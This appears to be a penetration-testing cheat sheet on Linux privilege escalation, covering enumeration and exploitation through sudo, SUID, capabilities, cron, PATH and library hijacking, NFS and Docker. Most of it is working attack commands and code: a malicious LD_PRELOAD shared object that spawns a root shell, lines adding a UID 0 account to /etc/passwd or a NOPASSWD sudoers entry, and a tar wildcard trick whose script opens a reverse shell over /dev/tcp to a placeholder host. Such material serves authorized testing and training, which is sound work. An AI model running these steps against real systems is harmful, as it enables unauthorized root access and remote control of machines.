---
title: "Linux Privilege Escalation"
ShowToc: true
TocOpen: false
build:
  list: never
---

[← Cheat Sheets](../) · {{< download "/dl/cheatsheets/07_linux_privilege_escalation.md" "Download this sheet (.md)" >}}


> Turn an existing permission, misconfiguration, or vulnerable component into
> execution as a more privileged user (usually root). Enumerate first, map each
> finding to a technique below, then take the shortest working path.
> [GTFOBins](https://gtfobins.github.io/) is the reference for abusing a specific binary.

## Enumeration

Run the checks, and follow the link when something looks promising.

| command | usage |
| ------- | ----- |
| `whoami; id` | user, UID, GID, groups |
| `uname -a; cat /etc/os-release` | OS, kernel, architecture |
| `env` | environment (shell, PATH, ...) |
| `hostname; ip addr; ip route` | host identity, interfaces, routes |

> group `docker` or `lxd` -> [Docker and LXD](#docker-and-lxd)
> group `shadow` -> [Weak File Permissions](#weak-file-permissions)
> in a restricted shell -> [Restricted Shell Escape](#restricted-shell-escape)

**Sudo rights**
```bash
sudo -l
```
> a permitted command -> [Sudo](#sudo) and its GTFOBins sudo entry
> `SETENV` or `env_keep+=LD_PRELOAD` -> [LD_PRELOAD](#ld_preload)

**Account & sudo files**
```bash
ls -l /etc/passwd /etc/shadow /etc/sudoers
```
> writable, or readable when they should not be -> [Weak File Permissions](#weak-file-permissions)

**Homes & SSH keys**
```bash
ls -la /home /home/<user> /home/<user>/.ssh
```
> a readable private key, or a writable `authorized_keys` -> [Weak File Permissions](#weak-file-permissions)

**SUID / SGID binaries**
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```
> a SUID or SGID bit -> [SUID and SGID](#suid-and-sgid) and [GTFOBins](https://gtfobins.github.io/)

**Capabilities**
```bash
getcap -r / 2>/dev/null
```
> a capability such as `cap_setuid` -> [Linux Capabilities](#linux-capabilities)

**Cron jobs & scripts**
```bash
cat /etc/crontab; ls -la /etc/cron.*
```
> a privileged job running a writable script, an unqualified command, a python import, or a wildcard -> [Cron](#cron), [PATH Hijacking](#path-hijacking), [Python Library Hijacking](#python-library-hijacking), [Wildcard Injection](#wildcard-injection)

**Processes, sockets, mounts, writable files**

| command | usage |
| ------- | ----- |
| `ps aux` / `./pspy64` | running + short-lived processes (no root needed) |
| `ss -tulpn` | listening TCP/UDP sockets |
| `mount -l; cat /etc/fstab` | mounted filesystems and exports |
| `find / -writable -type f 2>/dev/null` | writable files |
| `cat ~/.bash_history` | leaked commands / credentials |

> an NFS export with `no_root_squash` -> [NFS no_root_squash](#nfs-no_root_squash)
> plaintext credentials -> reuse them (`su <user>`, SSH, services)

**Other interesting files**

| file | why |
| ---- | --- |
| `/etc/issue`, `/etc/hosts` | banner, other hosts |
| `/etc/crontab`, `/etc/cron.*` | system cron jobs |
| `/var/spool/cron/crontabs/*` | per-user cron jobs |
| `/var/`, `/opt/`, `/tmp/` | app data, logs, drop zones |

### Automated enumeration & tooling

| tool | usage |
| ---- | ----- |
| `./linpeas.sh` | broad LPE enumeration; read the red/yellow highlights |
| `./pspy64` | watch processes & cron without root (catches short-lived jobs) |
| `./linux-exploit-suggester.sh` | compare the kernel/system against known exploits |

**Get files onto the target**
```bash
# on kali
python3 -m http.server <port>
# on the target
wget http://<kali-ip>:<port>/<file>      # or: scp <file> <user>@<target>:/tmp/
```

**Reach a target-only service from kali (port forward)**
```bash
ssh <user>@<target> -L <kali-port>:localhost:<target-port>
```

## Exploitation

> [GTFOBins](https://gtfobins.github.io/) is your best friend. Useful tags: **Shell**, **SUID**, **SGID**, **Sudo**, **Capabilities**.

### Weak File Permissions

| command | usage |
| ------- | ----- |
| `ls -l /etc/passwd /etc/shadow /etc/sudoers` | check perms on the key files |
| `mkpasswd -m sha-512 <password>` | generate a SHA-512 crypt hash |
| `openssl passwd -6 '<password>'` | same, if `mkpasswd` is absent |

**`/etc/passwd` writable**: add a UID 0 account (`name:hash:UID:GID:comment:home:shell`):
```bash
echo 'pwn:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwn
```

**`/etc/shadow` writable**: replace a user's hash:
```
<username>:$<hash_type>$<salt>$<hash>:::::::
```

**`/etc/shadow` readable**: crack offline:
```bash
echo '<hash>' > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
> reading `/etc/shadow` is covered further in the passwords lab.

**`/etc/sudoers` writable**: grant yourself root:
```
<user> ALL=(ALL:ALL) NOPASSWD: ALL
```

**`~/.ssh/authorized_keys` writable**: add your own key:
```bash
ssh-keygen -t rsa                                  # on kali
cat id_rsa.pub >> /home/<user>/.ssh/authorized_keys
ssh <user>@<target> -i id_rsa
```
> found a private key instead? crack its passphrase: `ssh2john <key> > h && john h`.

### Sudo

> GTFOBins tag: **Sudo**.

| command | usage |
| ------- | ----- |
| `sudo -l` | allowed commands, run-as users, tags (`NOPASSWD`, `SETENV`) |
| `sudo <cmd>` | run a permitted command as root (check its GTFOBins sudo entry) |
| `sudo -u <user> <cmd>` | run as a permitted target user |
| `sudo <VAR>=<val> <cmd>` | run with an altered env var (needs `SETENV`) |
| `sudo -V` | sudo version; match against CVEs + the distro's patched revision |

### LD_PRELOAD

> When `sudo -l` shows `env_keep+=LD_PRELOAD` or `SETENV`.

1. malicious C on kali:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```
2. compile to a shared object:
```bash
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
```
3. transfer it (`scp exploit.so <user>@<target>:/tmp/`), then
4. run a permitted sudo command with it preloaded:
```bash
sudo LD_PRELOAD=/tmp/exploit.so <allowed-cmd>
```

### SUID and SGID

> A SUID binary runs with its owner's UID (root-owned = runs as root); SGID uses the
> file's group. Check the binary's GTFOBins **SUID** (or **SGID**) entry.

| command | usage |
| ------- | ----- |
| `find / -perm -4000 -type f 2>/dev/null` | SUID binaries |
| `find / -perm -2000 -type f 2>/dev/null` | SGID binaries |
| `ls -l <path>; file <path>` | confirm the bit, owner, format |
| `strings <path> 2>/dev/null` | embedded commands/paths (leads to PATH / library hijack) |

### Linux Capabilities

> Capabilities grant slices of root power to a binary without the SUID bit. Check the
> binary's GTFOBins **Capabilities** entry.

| command | usage |
| ------- | ----- |
| `getcap -r / 2>/dev/null` | enumerate file capabilities |
| `getcap <path>` | inspect one executable |

| capability | significance |
| ---------- | ------------ |
| `cap_setuid+ep` | set UID 0: an interpreter (python/perl) with this is root |
| `cap_dac_read_search+ep` | read any file (bypass read / search checks) |
| `cap_dac_override+ep` | bypass file permission checks for most operations |
| `cap_sys_admin+ep` | broad admin capability; impact depends on the operation |

```bash
# example: python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron

> A root cron job that runs a writable script, resolves a command by an unsafe PATH, or
> archives a writable directory with a wildcard. Confirm it actually runs as root (`pspy`).

```
# cron fields
MIN HOUR DAY MONTH WEEKDAY [USER] CMD
```

| location | holds |
| -------- | ----- |
| `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.*` | system jobs |
| `/var/spool/cron/crontabs/*` | per-user jobs |

> writable script -> edit it · command by name -> [PATH Hijacking](#path-hijacking) · python import -> [Python Library Hijacking](#python-library-hijacking) · wildcard -> [Wildcard Injection](#wildcard-injection)

### PATH Hijacking

> A privileged script calls a command by name (no absolute path) and you can write to a
> directory that comes earlier in that program's PATH.

```bash
strings <binary>            # find the unqualified command it calls
echo "$PATH"                # current search order
echo '/bin/bash' > /tmp/<cmd>; chmod +x /tmp/<cmd>
export PATH=/tmp:$PATH      # then trigger the privileged job
```

### Python Library Hijacking

> A privileged python script imports a module you can influence. Three routes: write to
> a writable module it imports, exploit `sys.path` ordering, or set `PYTHONPATH`.

```bash
python3 -c "import sys; print('\n'.join(sys.path))"   # import search order
export PYTHONPATH=/tmp                                # or drop a module earlier in sys.path
```
> the payload goes at the module's top level (runs on import), e.g.
> `import os; os.setuid(0); os.system("/bin/bash")`.

### Wildcard Injection

> An unquoted `*` is expanded by the shell before the command runs, and tools like `tar`
> read option-looking filenames as options. Exploit a privileged job over a writable dir.

```bash
# tar --checkpoint-action: drop these as filenames in the archived directory
echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

### Restricted Shell Escape

> Break out of rbash / rksh / a restricted ssh shell.

| command | bypass | usage |
| ------- | ------ | ----- |
| `env` | `echo $0` / `echo $PATH` | which shell, and the allowed-binaries directory |
| `ls <bindir>` | `echo <bindir>/*` | list the allowed binaries |

```bash
# request an unrestricted shell at ssh time
ssh <user>@<target> -t "/bin/sh"
ssh <user>@<target> -t "bash --noprofile"
```

### NFS no_root_squash

> An export with `no_root_squash` does not downgrade client root: mount it as root and
> plant a root-owned SUID binary that the target then runs with root privileges.

```bash
showmount -e <ip>                       # list exports on the server
cat /etc/exports 2>/dev/null            # check options (look for no_root_squash)
mount -t nfs <ip>:<export> /mnt         # mount locally (as root)
cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
# on the target:  /path/rootbash -p
```

### Docker and LXD

> Membership in `docker` or `lxd` is effectively root: the daemon runs as root and can
> mount the host filesystem into a container.

```bash
id                                      # check for docker / lxd membership
# mount host root into a container as root
docker run -v /:/mnt --rm -it <image> chroot /mnt sh
```

No internet on the target? Ship an image over:
```bash
# on kali
docker pull alpine:latest
docker save -o alpine.tar alpine:latest
# on the target
docker load -i alpine.tar
```

## General Tips

- Start every box with: `id`, `sudo -l`, kernel/OS, SUID/SGID, capabilities, cron, groups, writable paths.
- Search GTFOBins for the exact binary in the right context (**SUID**, **Sudo**, **Capabilities**).
- A writable file only matters if a **privileged** process consumes it; trace the full chain.
- For CVEs, match the distro's patched package revision and prerequisites, not just the upstream version.
- Only run this against systems you are authorized to test.
